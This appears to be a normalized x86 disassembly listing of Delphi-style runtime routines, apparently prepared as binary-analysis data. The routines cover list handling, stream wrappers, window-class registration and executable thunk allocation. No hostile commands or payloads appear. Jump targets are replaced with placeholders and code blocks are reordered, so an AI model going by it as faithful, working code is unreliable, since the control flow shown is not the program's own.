mov esi ecx
mov ebx edx
mov edi eax
mov al [ r-xdata ]
mov [ edi + 0x24 ] al
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax edi
test bl bl
je r-xdata
mov edx edi
mov eax esi
call sub_42017c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_420010
push ebx
push esi
push ecx
call sub_4035e0
mov [ esp ] dl
mov ebx eax
mov eax ebx
call sub_420264
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_42020c
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
mov dl [ esp ]
and dl 0xfc
mov eax ebx
call sub_41ab9c
cmp [ esp ] 0x0
jle r-xdata
mov edx ebx
call sub_4201d4
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax ebx
call sub_4035c8
lea eax [ ebx + 0x14 ]
call sub_40d788
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx [ esi + 0x8 ]
dec edx
mov eax esi
call sub_41a5d0
mov cl 0x1
mov edx ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_420094
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
cmp eax [ esi + 0x4 ]
je r-xdata
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_41a62c
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ ebx + 0x14 ] eax
or [ ebx + 0x1c ] 0x100
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_41a474
mov edx ebx
mov eax esi
call sub_420094
sub_420128
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_41a474
mov [ esi + 0x4 ] ebx
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ ebx + 0x10 ] eax
sub_420154
push ebx
mov ebx eax
xor eax eax
mov [ edx + 0x4 ] eax
mov eax [ ebx + 0x10 ]
call sub_41a714
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
call sub_403254
xor eax eax
mov [ ebx + 0x10 ] eax
sub_42017c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_403450
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx ebx
mov eax edi
mov esi [ eax ]
call [ esi + 0x20 ]
mov edx ebx
mov eax edi
call sub_420128
mov dl 0x1
mov eax ebx
call sub_42069c
test [ edi + 0x1c ] 0x10
je r-xdata
xor ecx ecx
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop edi
pop esi
pop ebx
retn
mov cl 0x1
mov dl 0x1
mov eax ebx
call sub_42064c
sub_4201d4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
push 0x0
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x20 ]
mov cl 0x1
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
xor edx edx
mov eax ebx
call sub_42069c
mov edx ebx
mov eax esi
call sub_420154
pop edi
pop esi
pop ebx
retn
sub_42020c
push ebx
push esi
push edi
mov esi eax
jmp r-xdata
mov ebx [ esi + 0x10 ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_41a6b8
mov edi eax
test [ edi + 0x1d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
call sub_4201d4
jmp r-xdata
mov ax [ r-xdata ]
and ax [ esi + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx edi
mov eax esi
call sub_420154
sub_420264
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
or [ ebx + 0x1c ] 0x8
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_41a5d0
call sub_420264
inc edi
dec esi
jne r-xdata
sub_4202a0
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
pop ebx
retn
call sub_41a714
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
call sub_403254
xor eax eax
mov [ ebx + 0x14 ] eax
sub_4202c4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4202a0
mov edx ebx
mov eax esi
call sub_4202a0
pop esi
pop ebx
retn
sub_4202e0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
cmp [ esp ] 0x1
jne r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx edi
mov eax esi
call sub_4202c4
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_41a5d0
mov cl [ esp ]
mov edx edi
mov ebp [ eax ]
call [ ebp + 0x10 ]
dec ebx
mov eax [ esi + 0x10 ]
mov eax [ eax + 0x8 ]
cmp ebx eax
jl r-xdata
test ebx ebx
jge r-xdata
mov ebx eax
dec ebx
sub_42033c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push ebx
push sub_4200e8
push ebx
push sub_420110
mov ax [ ebx + 0x18 ]
cmp ax [ ebp - 0x4 ]
setne cl
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_4200fc
push ebx
push sub_42011c
mov ax [ ebp - 0x2 ]
cmp ax [ ebx + 0x1a ]
setne cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
sub_420434
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test edi edi
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4081d4
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x4 ] 0x0
je r-xdata
cmp ebx [ edi + 0x4 ]
jne r-xdata
push esi
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov edx esi
mov eax ebx
call sub_4204cc
test eax eax
je r-xdata
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd20
call sub_4039e0
sub_4204cc
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
cmp [ esp ] 0x0
je r-xdata
xor esi esi
cmp [ edi + 0x10 ] 0x0
je r-xdata
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor ebp ebp
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
dec ebx
jne r-xdata
mov eax [ edi + 0x10 ]
mov edx ebp
call sub_41a5d0
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esp ]
call sub_4081d4
test al al
jne r-xdata
sub_42051c
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
mov edx esi
call sub_4043b0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
call sub_408358
test al al
jne r-xdata
push esi
mov ecx [ ebx + 0x8 ]
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x20 ]
push esi
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0x20 ]
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd20
call sub_4039e0
xor edx edx
mov eax ebx
call sub_42069c
mov edx esi
mov eax ebx
call sub_4205a8
mov dl 0x1
mov eax ebx
call sub_42069c
sub_4205bc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_41a5d0
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ecx esi
mov eax [ r-xdata ]
call sub_41a55c
sub_4205f8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x10 ]
mov edx ebx
call sub_41a62c
test eax eax
jl r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ edx + 0x10 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_41a4c0
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx ebx
mov edx esi
call sub_41a64c
sub_42064c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
test bl bl
je r-xdata
and [ esi + 0x1c ] 0xffef
or [ esi + 0x1c ] 0x10
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4205e8
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
cmp [ esp ] 0x0
je r-xdata
inc ebp
xor edi edi
mov edx edi
mov eax esi
call sub_4205bc
mov cl 0x1
mov edx ebx
call sub_42064c
inc edi
dec ebp
jne r-xdata
sub_42069c
push ebx
push esi
push edi
add esp 0xffffff00
mov ebx edx
mov edi eax
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
add esp 0x100
pop edi
pop esi
pop ebx
retn
mov eax esp
mov edx [ edi + 0x8 ]
mov ecx 0xff
call sub_404240
mov edx esp
mov eax esi
call sub_403528
test eax eax
je r-xdata
test bl bl
je r-xdata
xor edx edx
mov [ eax ] edx
mov [ eax ] edi
jmp r-xdata
sub_4206e4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_42070c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_420754
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
push edi
push esi
mov eax [ ebx + 0x20 ]
push eax
mov eax [ eax ]
call [ eax ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_403308
test al al
je r-xdata
mov eax 0x80004002
jmp r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_420794
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_4207b4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_4207d8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403224
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_420820
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403244
test bl bl
jle r-xdata
mov edx esi
call sub_420a50
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_420888
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x10 ] esi
test esi esi
je r-xdata
mov edx ebx
call sub_420a50
mov edx ebx
mov eax esi
call sub_420a44
sub_4208cc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41ffc4
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ esi + 0x50 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_420910
push ebx
push esi
push edi
call sub_4035e0
mov ebx edx
mov edi eax
mov edx ebx
and dl 0xfc
mov eax edi
call sub_420010
mov eax [ edi + 0x30 ]
test eax eax
je r-xdata
mov esi [ edi + 0x50 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx edi
call sub_4202c4
jmp r-xdata
mov eax esi
call sub_41a6b8
mov edx eax
mov eax edi
call sub_420a50
lea eax [ edi + 0x50 ]
call sub_40d788
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035c8
sub_420970
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_4202e0
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x30 ]
jne r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
sub_42099c
push ebx
cmp [ eax + 0x42 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov al 0x1
pop ebx
retn
sub_4209b8
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
mov al 0x1
pop ebx
retn
sub_4209d4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x40 ]
jne r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x44 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x40 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x44 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx edi
mov eax [ ebx + 0x50 ]
call sub_41a5d0
mov edx [ eax ]
call [ edx + 0x10 ]
inc edi
dec esi
jne r-xdata
sub_420a50
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
xor eax eax
mov [ ebp + 0x10 ] eax
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_41a4c0
jmp r-xdata
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_41a5d0
cmp ebp eax
jne r-xdata
sub_420a90
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x30 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_4202c4
mov edx ebx
call sub_420094
sub_420abc
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403224
mov [ edi + 0xc ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x10 ] al
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_420b04
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
cmp [ esi + 0x10 ] 0x1
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403244
test bl bl
jle r-xdata
mov eax [ esi + 0xc ]
call sub_403254
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_420b3c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_420b8b
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_420ba4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_420bf3
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_420c0c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_420c76
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
mov ebx 0x80030001
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp ebx 0x2
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
mov eax [ esi + 0xc ]
mov ecx ebx
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
sub_420c90
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_420cd9
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebx + 0xc ]
call sub_41c2e8
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ ebp + 0x10 ]
jne r-xdata
je r-xdata
cmp eax [ ebp + 0xc ]
xor ebx ebx
mov ebx 0x80004005
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_420cf4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
call sub_405a7c
xor eax eax
push ebp
push sub_420ee1
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
xor edx edx
push ebp
push sub_420eba
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x100000
jbe r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0xc ] 0x100000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_4027c4
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_420ea9
push [ fs : edx ]
mov [ fs : edx ] esp
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x10 ] 0x0
ja r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4027e4
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x20 ]
mov [ eax ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x4 ] edx
mov esi [ ebp + 0x10 ]
mov esi 0x7fffffff
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x4 ] edx
cmp esi [ ebp - 0xc ]
jle r-xdata
test esi esi
jle r-xdata
mov eax esi
mov eax [ ebp - 0xc ]
jmp r-xdata
mov eax ebx
cdq
add [ ebp - 0x18 ] eax
adc [ ebp - 0x14 ] edx
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
add [ ebp - 0x20 ] eax
adc [ ebp - 0x1c ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_403a8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc ]
xchg ecx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420ee8
lea eax [ ebp + 0xc ]
call sub_405a08
retn
sub esi ebx
mov eax ebx
cdq
sub [ ebp + 0x10 ] eax
sbb [ ebp + 0x14 ] edx
test esi esi
jg r-xdata
call sub_403a8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x80004005
sub_420f24
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
xor esi esi
xor eax eax
push ebp
push sub_420f87
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebx + 0x4 ] 0x2
mov eax [ edi + 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x18 ] eax
xor eax eax
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x20 ] eax
xor eax eax
mov [ ebx + 0x24 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_420fb8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_41a978
mov edi eax
xor eax eax
push ebp
push sub_42100d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421014
mov eax [ rw-data ]
call sub_41a9dc
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_41a5d0
call sub_403254
inc esi
dec ebx
jne r-xdata
sub_42102c
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov edx esp
mov eax [ ecx + 0x4 ]
call [ ecx ]
add esp 0xc
pop eax
pop ebp
retn 0x10
sub_421054
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
cmp [ edi ] 0x0
jne r-xdata
mov eax [ edi ]
mov ebx [ edi ]
mov edx [ ebx + 0x5 ]
mov [ edi ] edx
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x5 ] edx
mov edx [ ebp + 0xc ]
mov [ ebx + 0x9 ] edx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0x40
push 0x1000
push 0x1000
push 0x0
call VirtualAlloc
mov esi eax
mov eax [ rw-data ]
mov [ esi ] eax
lea edx [ esi + 0x4 ]
mov eax rw-data
mov ecx 0x2
call sub_4029c0
mov edx sub_42102c
lea eax [ esi + 0x5 ]
call sub_42104c
mov [ esi + 0x6 ] eax
lea ebx [ esi + 0xa ]
mov [ ebx ] 0xe8
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_42104c
mov [ ebx + 0x1 ] eax
mov eax [ edi ]
mov [ ebx + 0x5 ] eax
mov [ edi ] ebx
add ebx 0xd
mov eax ebx
sub eax esi
cmp eax 0xffc
jl r-xdata
mov [ rw-data ] esi
sub_421110
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov eax [ rw-data ]
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test al al
je r-xdata
mov edx DefWindowProcA
cmp edx [ ebp - 0x24 ]
je r-xdata
push rw-data
call RegisterClassA
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call UnregisterClassA
push 0x80000000
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov ecx r-xdata
mov edx [ rw-data ]
mov eax 0x80
call sub_406eac
mov ebx eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_421054
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
sub_4211c4
push ebx
push esi
mov esi eax
push 0xfffffffc
push esi
call GetWindowLongA
mov ebx eax
push esi
call DestroyWindow
cmp ebx DefWindowProcA
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4210ec
sub_4211ec
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_421290
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
